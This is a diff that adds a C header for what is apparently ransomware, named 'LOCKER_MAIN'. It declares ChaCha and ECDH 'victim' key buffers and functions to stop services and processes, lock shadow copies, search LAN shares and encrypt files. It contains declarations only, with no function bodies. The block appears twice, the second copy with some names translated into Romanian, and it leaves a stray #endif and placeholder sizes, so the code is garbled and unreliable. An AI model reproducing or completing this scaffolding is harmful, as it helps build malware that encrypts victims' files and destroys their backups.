@@ -1,0 +1,65 @@
+#ifndef __LOCKER_MAIN__
+#define __LOCKER_MAIN__
+//se va include librăria specifică criptării/decriptării
+#define ARRAY_SIZE(x) (sizeof(x) / sizeof(x)[0])
+BOOLEAN ChaKey1Set();
+VOID ECDHPrivKeySet(BYTE *input, int incount);
+VOID MontarePartiție();
+VOID ServiceLock();
+VOID ProcessLock();
+VOID ShadowLock();
+VOID SearchLAN(LPNETRESOURCEW resourcename);
+DWORD WINAPI SearchFilesThreaded(LPVOID lpParam);
+VOID SearchFiles(WCHAR *pathname, int layer);
+VOID CryptFile(const WCHAR *filename);
+BOOL IsWow64Process();
+PCHAR *CommandLineToArgvA(PCHAR CmdLine, int *_argc);
+LPVOID HeapAlloc(int len);
+VOID HeapFree(LPVOID mem);
+typedef BOOL WINAPI(*pdef_IsWow64Process)(HANDLE hProcess, PBOOL bResult);
+typedef BOOL WINAPI(*pdef_Wow64DisableWow64FsRedirection)(PVOID *OldValue);
+typedef BOOL WINAPI(*pdef_Wow64RevertWow64FsRedirection)(PVOID OldValue);
+typedef BOOLEAN WINAPI(*pdef_RtlGenRandom)(PVOID RandomBuffer,ULONG RandomBufferLength);
+BYTE CHA_KEY_1[x];
+BYTE CHA_KEY_2[x];
+BYTE CHA_FINAL_1[x];
+BYTE CHA_FINAL_2[x];
+BYTE CHANONCE_1[12];
+BYTE CHANONCE_2[12];
+BYTE CHA_FINAL[x];
+BYTE VICTIM_ECDH_PUBLIC[ECC_PUB_KEY_SIZE];
+BYTE VICTIM_ECDH_PRIVATE[ECC_PRV_KEY_SIZE];
+BYTE ECDH_SECRET[ECC_PUB_KEY_SIZE];
+CRITICAL_SECTION critSection;
+#endif
+#define ARRAY_SIZE(x) (sizeof(x) / sizeof(x)[0])
+BOOLEAN ChaKey1Set();
+VOID ECDHPrivKeySet(BYTE *input, int incount);
+VOID MontarePartiție();
+VOID ServiciuBlocat();
+VOID ProcesBlocat();
+VOID RezerveBlocate();
+VOID SearchLAN(LPNETRESOURCEW resourcename);
+DWORD WINAPI SearchFilesThreaded(LPVOID lpParam);
+VOID SearchFiles(WCHAR *pathname, int layer);
+VOID CryptFile(const WCHAR *filename);
+BOOL IsWow64Process();
+PCHAR *CommandLineToArgvA(PCHAR CmdLine, int *_argc);
+LPVOID HeapAlloc(int len);
+VOID HeapFree(LPVOID mem);
+typedef BOOL WINAPI(*pdef_IsWow64Process)(HANDLE hProcess, PBOOL bResult);
+typedef BOOL WINAPI(*pdef_Wow64DisableWow64FsRedirection)(PVOID *OldValue);
+typedef BOOL WINAPI(*pdef_Wow64RevertWow64FsRedirection)(PVOID OldValue);
+typedef BOOLEAN WINAPI(*pdef_RtlGenRandom)(PVOID RandomBuffer,ULONG RandomBufferLength);
+BYTE CHA_KEY_1[x];
+BYTE CHA_KEY_2[x];
+BYTE CHA_FINAL_1[x];
+BYTE CHA_FINAL_2[x];
+BYTE CHANONCE_1[12];
+BYTE CHANONCE_2[12];
+BYTE CHA_FINAL[x];
+BYTE VICTIM_ECDH_PUBLIC[ECC_PUB_KEY_SIZE];
+BYTE VICTIM_ECDH_PRIVATE[ECC_PRV_KEY_SIZE];
+BYTE ECDH_SECRET[ECC_PUB_KEY_SIZE];
+CRITICAL_SECTION critSection;
+#endif
